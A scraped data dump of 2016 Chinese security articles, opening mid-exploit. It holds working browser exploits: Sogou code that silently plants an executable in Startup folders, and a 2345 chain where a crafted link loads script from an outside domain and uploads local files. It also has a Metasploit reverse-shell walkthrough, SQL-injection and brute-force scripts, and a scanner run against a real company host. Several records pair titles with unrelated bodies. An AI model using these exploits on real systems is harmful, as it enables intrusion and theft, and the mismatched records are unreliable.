'se-extension://ext238561744/background.html';         // Denied    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';    try {      while (x1.contentDocument) { ml(); }    } catch(e) {      var users_str = '';      for (var i = 0; i < users.length; ++i) {        users_str += ('""' + users[i] + '""');        if (i != users.length - 1)          users_str += ',';      }      x1.src = ""javascript:if(location != 'about:blank') { var users=["" + users_str + ""]; for (var i = 0; i < users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}""    }  }}录个用伪协议执行的GIFaddRow\(""([^""]+)""/g) || [];  var currentUser=[];  for(var i = 0; i < users.length; i++) {    var user = (users[i].match(/addRow\(""([^""]+)""/) || ["""", """"])[1];    if(["".."", ""All Users"", ""Default"", ""Default User"", ""Public"", ""UpdatusUser"", ""desktop.ini""].indexOf(user) == -1) {      currentUser.push(user);    }  }  console.log(currentUser);  return currentUser;}window.external.extension(""getRecommendSidebarExts"", ""file:///C:/Users/"", function () {    var data = JSON.parse(arguments[0]);  if (data.success != true)    return;  location.href = 'http://127.0.0.1/exploit.html?users=' + getUsers(data.data);});写文件到启动目录下：function f() {    console.log(""f()"")  if (++c1 == 2) {    var users = top.location.search.replace('?users=').split(',');    var x1 = x.contentWindow[0].frameElement.nextSibling;    // x1.src = 'se-extension://ext238561744/background.html';         // Denied    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';    try {      while (x1.contentDocument) { ml(); }    } catch(e) {      var users_str = '';      for (var i = 0; i < users.length; ++i) {        users_str += ('""' + users[i] + '""');        if (i != users.length - 1)          users_str += ',';      }      x1.src = ""javascript:if(location != 'about:blank') { var users=["" + users_str + ""]; for (var i = 0; i < users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}""    }  }}录个用伪协议执行的GIF","2016-10-18 17:34:11","Web安全","搜狗浏览器从UXSS到远程命令执行","http://nsoad.com/Article/web/20161018/592.html"
"5ccbfa6c4f2f0a0a7a69c064","上文我已经介绍了IIS短文件名暴力枚举漏洞的成因和利用。这里只是发出昨天写的脚本。脚本可以测试对应的URL是否存在漏洞，若存在漏洞，则猜解文件夹下所有的短文件名：包括","Kender","上文我已经介绍了IIS短文件名暴力枚举漏洞的成因和利用。这里只是发出昨天写的脚本。脚本可以测试对应的URL是否存在漏洞，若存在漏洞，则猜解文件夹下所有的短文件名：包括文件和文件名。网上早前已经有公开的工具了：https://code.google.com/p/iis-shortname-scanner-poc/我没有参考他的代码。自己用python实现了一个漏洞利用脚本。简单测试，发现比上面的POC能猜解到更多的文件和文件夹。获取源代码：  https://github.com/lijiejie/IIS_shortname_Scanner   (已于Oct 27, 2016更新）测试： IIS_shortname_Scan.py http://stom.tencent.com最终结果：通过联想，就可以猜解到上传页：  http://stom.tencent.com/tapdupfile.aspx----------------------------------------------------------------Dir: /aspnet~1File: /logina~1.csFile: /tapdap~1.csFile: /tapdup~1.csFile: /queryg~1.ash*File: /queryi~1.ash*File: /queryp~1.ash*File: /tapdap~1.asp*File: /tapdup~1.asp*----------------------------------------------------------------1 Directories, 8 Files found in totalNote that * is a wildcard, matches any character zero or more times.","2016-11-03 05:26:46","安全工具","IIS短文件名暴力枚举漏洞利用工具(IIS shortname Scanner)","http://nsoad.com/Security-tools/20161103/tools-684.html"
"5ccbfa6c4f2f0a0a7a69c065","搜狗浏览器从UXSS到远程命令执行","Kong","最令站长头疼的事莫过于自己的网站被黑。如果没有合适的安全措施，即便站长再怎么用心，也会失去网站的控制权。黑客入侵网站之后，可以在上面搭载钓鱼页面，传播恶意软件，盗取敏感信息等。在这篇文章中，我们将会看到一个网站被用来传播有关Windwos序列号的广告内容。垃圾内容和黑名单近期，我们分析了一个被重定向到第三方域名的网站。黑客通常利用这种类型的恶意跳转，劫持网站流量，重定向到其它网站。黑客攻击网站传播垃圾内容，出于两个目的：利用你的用户提高影响力和产生流量欺骗搜索引擎提高他们自己网站的排名暂且不论他们的动机，这些垃圾内容会影响你的网站的用户和声誉。很不幸，许多站长直到收到来自用户的反映、被加入黑名单，或者在搜索引擎结果页面（Search Engine Result Pages ，SERP）上被加上警告标记时，才察觉他们的网站被黑。当Google怀疑某个网站在发布垃圾内容，他们会在SERP中添加如下标记：可以在这里了解更多关于这个标记的知识。为了解决这一问题，站长需要按照这个步骤来移除SERP的警告。如果攻击者用网站来传播恶意软件等不正当活动,Google会将该网站加入黑名单，给访问者显示如下页面：修改核心文件如果幸运的话，站长可以快速识别出攻击。但不幸的是，攻击往往会潜伏几天甚至几周。黑客不断研究新的方法调整和隐藏他们的恶意内容，导致站长难以及时发现。有一位站长发现他的网站把访客重定向到一个恶意域名，如下：    “windows7keyonsale.com/windows-8-c-9.html”    “allsoftwaredownload.com/windows-8-1-product-key-generator/”访客被重定向到攻击者的域名之后，会看到下面的图片：这太糟了，原来的网站并不是售卖Windows序列号的。黑客插入了一些代码，执行重定向，如下：规避搜索引擎这段代码做了什么？除了加载恶意页面并展示给用户之外，它还试图规避搜索引擎的检测。此类重定向的目的一般是，在站长不知情的情况下将流量定向到自己的域名。为了让攻击隐藏得更深，他们还会规避Google这样的搜素引擎。为了阻止Google将页面标记为恶意，这段代码试图规避这一危险。如果SERP显示了警告信息，搜索者就不大可能点击它了，这会导致攻击失效。监测和保护每分钟都有网站重定向，插入垃圾内容，网站资产受到影响。我们也发现另外一个被黑的网站，攻击者修改了CMS的核心文件，执行恶意活动。如果你有文件完整性监测工具，并且做了备份，就可以很容易恢复到网站的正常状态。仔细检查日志也很重要，可以找到被攻击的起点，防止再次遭受攻击。就防御而言，最好使用web应用防火墙，以及修改密码。如果你发现网站被黑，想要自己清理网站，而且使用的是WordPress的话，可以参考这个方法-如何清理被黑的WordPress网站。","2016-10-16 15:58:38","Web安全","黑客修改WordPress核心文件，劫持网站流量","http://nsoad.com/Article/web/20161016/573.html"
"5ccbfa6c4f2f0a0a7a69c066","Fancy3D引擎（YY浏览器）远程命","Kong","写在前面的话我撰写这篇文章目的就是为了教会大家如何去利用RedHat8 Web服务器中存在的一种新型堆栈溢出漏洞来实现攻击。在这篇文章中，我将会列出漏洞利用过程中所有需要用到的工具、实用命令以及控制指令。当然了，我不仅会告诉大家如何利用这个漏洞，我还会跟大家解释漏洞利用背后的实现原理。在此，我假设各位读者对编程和计算机体系架构已经有基本的了解了。但是也请各位不用担心，我在文章中仍然会对这部分内容进行介绍。 工具的使用Kali Linux我强烈建议各位在开始动手操作之前安装好Kali Linux，因为这款渗透测试神器包含有我们所要使用的所有工具。Metasploit在操作过程中，我们需要使用Metasploit来生成我们的反向tcp shell代码，然后再将其嵌入至我的攻击payload中。我所使用的shell代码为linux/x86/shell_reverse_tcp（外加x86/alpha_mixed编码器）。接下来，我会跟大家解释我为何要使用这两项设置。除此之外，我还需要Metasploit来帮助我确定攻击payload的大小。Netcat我需要使用Netcat来发送我们的payload，并且对指定的端口设置一个监听器。我之所以选择Netcat，是因为这款工具不仅使用起来非常简单，而且它还可以处理所有TCP/IP层的重要协议。我们只需要通过一个简单的命令--“nc -l -p [端口号]”就可以开始对特定的端口进行监听了。除此之外，我还需要使用Netcat来向包含漏洞的RedHat8服务器发送GET请求。GDB调试器在漏洞利用的过程中，我需要使用GDB调试器（命令为“gdb -core [文件名]”）来查看我们从目标RedHat8服务器中导出的本地文件副本。其他需要使用的命令如下：info reg         显示寄存器中所有的信息x/64 REGISTER(+/- bytes)        显示寄存器地址中的内存数据如何运行我们的漏洞利用代码假设文件“exploit_gen.py”已经存在于我们的攻击设备中了。现在，我们将要使用Netcat来监听8118端口，然后通过GET请求和端口“SERVERPORTNUM”来将我们生成的攻击payload发送给目标服务器。1. 打开两个终端窗口；2. 在终端窗口A中运行下列命令，开启对端口8118的监听：nc -l 8118 (on Linux)3. 在终端窗口B中运行下列命令：EGG=python exploit_gen.pyecho GET /$EGG HTTP/1.0|nc VICTIM SERVERPORTNUM生成Shell代码在这一章节中，我会告诉大家如何生成我们的shell代码。我之所以要把这部分内容放在后面，是因为我感觉这一步骤实在是太无聊了。为了生成Shell代码，我们还是得使用Metasploit。与之前一样，首先打开一个终端窗口，然后输入命令“msfconsole”，此时我们将会进入Metasploit的控制台。虽然网上有很多介绍Metasploit的文章，但是在这篇文章中我只会介绍现在所要使用的东西。简而言之，我们只需要运行下列命令，就可以生成我们的Shell代码了。use linux/x86/shell_reverse_tcpset LHOST AttackerIP (目标主机的IP地址)set LPORT 8118generate -t python -e x86/alpha_mixed首先，我们要告诉Metasploit，我们要使用的exploit是shell_reverse_tcp。接下来，我们要设置需要进行攻击的目标主机IP地址，然后再设置需要监听的端口。请注意，不要使用默认的4444端口，因为可能已经有人正在监听这个端口了，所以我们在这里使用的是8118端口。最后，为了让我们所生成的Shell代码能够兼容Python，我们就要使用一个名为“alpha_mixed”的编码机制了，它可以帮助我们移除掉某些目标服务器无法识别的特殊字符。接下来，Metasploit会输出相应的Python代码，你可以直接将代码复制粘贴进我们的“exploit_gen.py”文件中。“shell_reverse_tcp”中的代码是使用机器语言编写的，这也就意味着它的代码基本上都是操作码。这些操作码可以让计算机通过我们指定的IP地址和端口号来建立一个TCP/IP链接，然后帮助我们向目标主机中发送shell代码。采用机器语言编写的代码对我们来说是非常重要的，因为这样一来，我们在生成攻击代码时，就可以不用根据目标主机的情况来考虑我们所需使用的语言了。 将所有生成的东西整合在一起既然我们已经制作好了“exploit_gen.py”文件，那么我们就可以像往常一样将该文件地址分配给“$EGG”变量了。那么接下来，打开两个单独的终端窗口，一个用来向目标Web服务器发送“$EGG”变量的内容，另一个用来控制Netcat去监听TCP shell的返回信息。这些操作全部都可以在Kali Linux中完成：终端A：nc -l 8118 (这里的端口号需要与我们用来生成shell代码的端口相同)终端B：EGG=python exploit_gen.pyecho GET /$EGG HTTP/1.0|nc VictimIP 8888如果一切顺利的话，你应该可以在运行了Netcat的那个终端中看到shell提示符了。话虽如此，但是事情总是不会进展得如此顺利的。在我的实验过程中，我从未在监听端口的过程中拿到过反向shell。如果你的情况与我一样，请你振作起来，因为我接下来会告诉你为什么会出现这种情况。 深入分析在运行完这些命令，并将“$EGG”变量的内容发送至目标RedHat8服务器之后，进入目标主机然后检查它的核心文件，你将会得到如下图所示的信息：那么你可能会问了，“Segmentation fault”是什么意思呢？就我的经验来看，当某个程序尝试访问其沙箱之外的内存地址时，系统就会抛出这个错误。这种情况之所以会发生，更加确切地说，是因为当这个程序需要访问EIP寄存器中的数据时，寄存器地址指向的是一个无效指令。好的，那么接下来的问题是，地址0xbffffa0f到底有什么？结果我发现，这个地址指向的竟然是我shell代码的中间部分！实际上，我们可以通过“info reg”命令来验证EIP寄存器中的信息，这个地址的确指向的是我的shell代码。那么ESP寄存器中保存着什么呢？如下图所示： 这意味着什么？其实我自己也不是很确定。但是在进行了一番分析之后，我可以确定的是，我的shell代码已经被执行了，但是可能在初始化TCP/IP链接的过程中遇到了一些小问题。我之所以可以确定shell代码得到了完整的执行，是因为ESP寄存器中的数据发生了改变，这也就意味着堆栈信息不知为何被返回了。我曾尝试过去验证这一想法，但是这确实很难。我只知道防火墙是无法阻止两台虚拟机之间的通信的，因为两台虚拟机之间是可以相互Ping通的。但是为什么防火墙会阻止一个TCP/IP shell呢？但是我在思考过后发现，这样想其实是完全错误的！于是我打开了我的笔记本电脑，然后尝试通过一台远程设备（一台Ubuntu 16.04主机）来重新对一台远程RedHat8服务器实施攻击。这就需要我们使用新的攻击主机IP地址来重新生成shell代码，然后将其复制粘贴进“exploit_gen.py”文件中。但是这里还存在一个问题—返回地址无法对齐。如果你还记得的话，我们可以导出“$EGG”变量的十六进制数据（使用命令“echo $EGG | hexdump –C”）来进行验证：虽然这只是一个小小的变化，但是这一次我们成功地拿到了shell！为什么会这样呢？有可能是因为虚拟机的设置有问题吧？说实话，我自己也不是很确定。如果有哪位同学知道的话，欢迎与我联系！","2016-10-14 17:13:10","Web安全","教你如何拿到RedHat8服务器的Shell","http://nsoad.com/Article/web/20161014/561.html"
"5ccbfa6c4f2f0a0a7a69c067","Fancy3D引擎（YY浏览器）远程命","Kong","本文属于浏览器安全系列第一篇,目录如下2345浏览器本地文件读取及远程命令执行百度浏览器远程命令执行搜狗浏览器从UXSS到远程命令执行Fancy3D引擎（YY浏览器）远程命令执行背景知识0x00 chrome-devtools本地文件读取漏洞在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URLchrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&amp;remoteFrontend=true  就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个111.txt并写入内容，运行服务器之后，在2345浏览器打开chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true。本地测试截图： 0x01 WebKit系浏览器伪协议调用在 http://www.wooyun.org/bugs/wooyun-2010-0175902 中，可以通过location.href=""vbefile:/../../../已知路径/1.js""来执行本地文件1.js 一步一步构造PoC0x00 首先我们来思考如何实现读取本地文件要让用户自己主动打开：chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://x.xx.com/file/&amp;remoteFrontend=true貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not allowed to load local resource，或打开页面是空白等措施。0x01 国产浏览器的毛病在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：chrome.ntp2345.prepareThumbnail，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！chrome.ntp2345.prepareThumbnail('chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true')  0x02 XSS来帮忙发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下site:2345.com inurl:url就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的http://wooyun.org/bugs/wooyun-2016-0179329 ，不受chrome限制的XSSAuditor一个反射型XSS。 0x03 本地文件读取PoC服务端代码：https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//  过程总结：cps.2345.com域名下的XSS，加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。0x04 我们来实现远程命令执行原理：（1）上述的chrome-devtools本地文件读取漏洞不仅能读取文件，还能读取文件列表！（2）我们可以通过浏览器的cache机制，写入我们指定的内容到浏览器的cache目录中（3）可以利用WebKit系浏览器伪协议调用执行cache文件。2345浏览器的默认cache目录在：C:\Users\%USERNAME%\AppData\Local\2345Explorer\User Data\Default\Cache。要执行这个目录下的cache文件，我们要解决两个问题，首先是找出当前系统的用户名，第二是定位到我们的恶意cache文件。第一个问题，我们可以通过读取C:\Users这个目录下的文件列表，得到用户列表。然后针对每个用户，执行以下的操作来定位恶意cache文件：获取cache目录下的文件列表，保存在localStorage中，然后利用插入img的方式写入恶意cache文件，完成后再获取一次cache目录下的文件列表，找出第二次集合中新增加的文件，上传到服务器中，前端跳转到执行页面，指定iframe的src为vbefile:/../../../../../../../../Users/xxx/AppData/Local/2345Explorer/User Data/Default/Cache/f_xxxx，从而达到命令执行的效果。服务端代码：https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196 用户点击：http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/xss.js%27;document.body.appendChild(s);//  测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。","2016-10-18 17:22:53","Web安全","2345浏览器本地文件读取及远程命令执行","http://nsoad.com/Article/web/20161018/590.html"
"5ccbfa6c4f2f0a0a7a69c068","百度浏览器远程命令执行","silence","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA（不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。本文介绍Brute Force模块的相关内容，后续教程会在之后的文章中给出。Brute ForceBrute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。下面将对四种级别的代码进行分析。Low服务器端核心代码<!--?phpif(isset($_GET['Login'])){//Getusername$user=$_GET['username'];//Getpassword$pass=$_GET['password'];$pass=md5($pass);//Checkthedatabase$query=""SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"";$result=mysql_query($query)ordie(''.mysql_error().''); if($result&amp;&amp;mysql_num_rows($result)==1){ //Getusersdetails $avatar=mysql_result($result,0,""avatar""); //Loginsuccessful echo""Welcometothepasswordprotectedarea{$user}""; echo""""; } else{ //Loginfailed echo""Usernameand/orpasswordincorrect.""; } mysql_close(); } ?&gt;可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。漏洞利用方法一爆破利用burpsuite即可完成第一步抓包第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$第三步选中Payloads，载入字典，点击Start attack进行爆破最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。 方法二手工sql注入1. Username:admin’ or ’1′=’1  Password:（空）注入成功   2. Username :admin’ #Password :（空）注入成功 Medium服务器端核心代码<!--?phpif(isset($_GET['Login'])){//Sanitiseusernameinput$user=$_GET['username'];$user=mysql_real_escape_string($user);//Sanitisepasswordinput$pass=$_GET['password'];$pass=mysql_real_escape_string($pass);$pass=md5($pass);//Checkthedatabase$query=""SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"";$result=mysql_query($query)ordie(''.mysql_error().''); if($result&amp;&amp;mysql_num_rows($result)==1){ //Getusersdetails $avatar=mysql_result($result,0,""avatar""); //Loginsuccessful echo""Welcometothepasswordprotectedarea{$user}""; echo""""; } else{ //Loginfailed sleep(2); echo""Usernameand/orpasswordincorrect.""; } mysql_close(); } ?&gt;相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。具体的mysql_real_escape_string函数绕过问题详见http://blog.csdn.net/hornedreaper1988/article/details/43520257http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html    漏洞利用虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。High服务器端核心代码<!--?phpif(isset($_GET['Login'])){//CheckAnti-CSRFtokencheckToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');//Sanitiseusernameinput$user=$_GET['username'];$user=stripslashes($user);$user=mysql_real_escape_string($user);//Sanitisepasswordinput$pass=$_GET['password'];$pass=stripslashes($pass);$pass=mysql_real_escape_string($pass);$pass=md5($pass);//Checkdatabase$query=""SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"";$result=mysql_query($query)ordie(''.mysql_error().''); if($result&amp;&amp;mysql_num_rows($result)==1){ //Getusersdetails $avatar=mysql_result($result,0,""avatar""); //Loginsuccessful echo""Welcometothepasswordprotectedarea{$user}""; echo""""; } else{ //Loginfailed sleep(rand(0,3)); echo""Usernameand/orpasswordincorrect.""; } mysql_close(); } //GenerateAnti-CSRFtoken generateSessionToken(); ?&gt;High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。漏洞利用由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。下面是我自己写的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。from bs4 import BeautifulSoupimport urllib2header={        'Host': '192.168.153.130',        'Cache-Control': 'max-age=0',        'If-None-Match': ""307-52156c6a290c0"",        'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',        'Accept': '*/*',        'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',        'Accept-Encoding': 'gzip, deflate, sdch',        'Accept-Language': 'zh-CN,zh;q=0.8',        'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'}requrl = ""http://192.168.153.130/dvwa/vulnerabilities/brute/""def get_token(requrl,header):    req = urllib2.Request(url=requrl,headers=header)    response = urllib2.urlopen(req)    print response.getcode(),    the_page = response.read()    print len(the_page)    soup = BeautifulSoup(the_page,""html.parser"")    user_token = soup.form.input.input.input.input[""value""] #get the user_token    return user_tokenuser_token = get_token(requrl,header)i=0for line in open(""rkolin.txt""):    requrl = ""http://192.168.153.130/dvwa/vulnerabilities/brute/""+""?username=admin&amp;password=""+line.strip()+""&amp;Login=Login&amp;user_token=""+user_token    i = i+1    print i,'admin',line.strip(),    user_token = get_token(requrl,header)    if (i == 10):        breakget_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。运行脚本时的Burpsuite截图打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。Impossible服务器端核心代码 <!--?phpif(isset($_POST['Login'])){//CheckAnti-CSRFtokencheckToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');//Sanitiseusernameinput$user=$_POST['username'];$user=stripslashes($user);$user=mysql_real_escape_string($user);//Sanitisepasswordinput$pass=$_POST['password'];$pass=stripslashes($pass);$pass=mysql_real_escape_string($pass);$pass=md5($pass);//Defaultvalues$total_failed_login=3;$lockout_time=15;$account_locked=false;//Checkthedatabase(Checkuserinformation)$data=$db--->prepare('SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;');$data-&gt;bindParam(':user',$user,PDO::PARAM_STR);$data-&gt;execute();$row=$data-&gt;fetch();//Checktoseeiftheuserhasbeenlockedout.if(($data-&gt;rowCount()==1)&amp;&amp;($row['failed_login']&gt;=$total_failed_login)){//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!//echo""Thisaccounthasbeenlockedduetotoomanyincorrectlogins.""; //Calculatewhentheuserwouldbeallowedtologinagain $last_login=$row['last_login']; $last_login=strtotime($last_login); $timeout=strtotime(""{$last_login}+{$lockout_time}minutes""); $timenow=strtotime(""now""); //Checktoseeifenoughtimehaspassed,ifithasn'tlockedtheaccount if($timenow&gt;$timeout) $account_locked=true; } //Checkthedatabase(ifusernamematchesthepassword) $data=$db-&gt;prepare('SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;'); $data-&gt;bindParam(':user',$user,PDO::PARAM_STR); $data-&gt;bindParam(':password',$pass,PDO::PARAM_STR); $data-&gt;execute(); $row=$data-&gt;fetch(); //Ifitsavalidlogin... if(($data-&gt;rowCount()==1)&amp;&amp;($account_locked==false)){ //Getusersdetails $avatar=$row['avatar']; $failed_login=$row['failed_login']; $last_login=$row['last_login']; //Loginsuccessful echo""Welcometothepasswordprotectedarea{$user}""; echo""""; //Hadtheaccountbeenlockedoutsincelastlogin? if($failed_login&gt;=$total_failed_login){ echo""Warning:Someonemightofbeenbruteforcingyouraccount.""; echo""Numberofloginattempts:{$failed_login}.Lastloginattemptwasat:${last_login}.""; } //Resetbadlogincount $data=$db-&gt;prepare('UPDATEusersSETfailed_login=""0""WHEREuser=(:user)LIMIT1;'); $data-&gt;bindParam(':user',$user,PDO::PARAM_STR); $data-&gt;execute(); } else{ //Loginfailed sleep(rand(2,4)); //Givetheusersomefeedback echo""Usernameand/orpasswordincorrect.Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.Ifthisisthecase,pleasetryagainin{$lockout_time}minutes.""; //Updatebadlogincount $data=$db-&gt;prepare('UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;'); $data-&gt;bindParam(':user',$user,PDO::PARAM_STR); $data-&gt;execute(); } //Setthelastlogintime $data=$db-&gt;prepare('UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;'); $data-&gt;bindParam(':user',$user,PDO::PARAM_STR); $data-&gt;execute(); } //GenerateAnti-CSRFtoken generateSessionToken(); ?&gt;可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。关于PDOhttp://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html","2016-10-16 16:01:27","Web安全","新手指南：DVWA-1.9全级别教程之Brute Force","http://nsoad.com/Article/web/20161016/574.html"
"5ccbfa6c4f2f0a0a7a69c069","本文属于浏览器安全系列第三篇,目录如下2345浏览器本地文件读取及远程命令执行","Kong","0x00DOM Based XSS由于其基于流量隐蔽的特点使很多人在制定检测策略的时候会把它单独提出来。关于漏洞和自动化检测策略详见参考链接，直奔主题吧，在漏洞挖掘中关于DOM Based的XSS自动化检测，有两个想法。第一是基于webkit检测数据包中的dom节点值的变化。第二是基于浏览器插件的被动检测，在浏览过程中使用JS代码提交带有特征的payload并监控dom节点中值的变化。先记录一下第一种的测试经过。0x01首先写一个简单的测试页面，点击write按键调用test()函数把cin框中内容写到t标签里。这里没有做任何过滤策略，显然可以触发一个dom型的XSS。首先试一下一般爬虫，这里对上面代码做一个简单修改，不需要点击提交直接将内容写入div标签。根据漏洞原理也易知，直接从response中是无法检测到我们插入的代码，从下图也可以看到dom based xss的特点。因此可以考虑使用程序中调用webkit来进行JavaScript解析，然后对返回内容进行检测。python可以使用QTwebkit或者phantomJS来实现。贴一下phantomJS的测试过程吧（QT有很多api包括遍历dom树等非常方便，但是写的时候发现pyload有很多在标签中的，直接通过api来获取有一些小问题）使用selenium来操作phantomJSfrom selenium import webdriverimport sysreload(sys)sys.setdefaultencoding('utf-8')driver = webdriver.PhantomJS(executable_path='/usr/bin/phantomjs') driver.get(""http://xxx/dom1.html"")#print driver.current_urljs = 'document.getElementById(""test"").value = ""&amp;lt;img src&amp;gt;"";'driver.execute_script(js)driver.find_element_by_id(""s"").click()print driver.page_source#print driver.find_element_by_id(""t"").textdriver.quit程序中execute_script()函数执行JS代码在input框中填入payload，然后调用click()函数点击write button。从上图可以看到我们写入页面的标签&lt;img &gt;。0x02那么可以编写一个思路如下的自动检测雏形：检测response中是否存在domxss漏洞特征函数(如innerHTML/document.wirte等等) -&gt; 生成JS给可控点value赋值为特征pyload -&gt; 生成JS触发关键函数 -&gt; 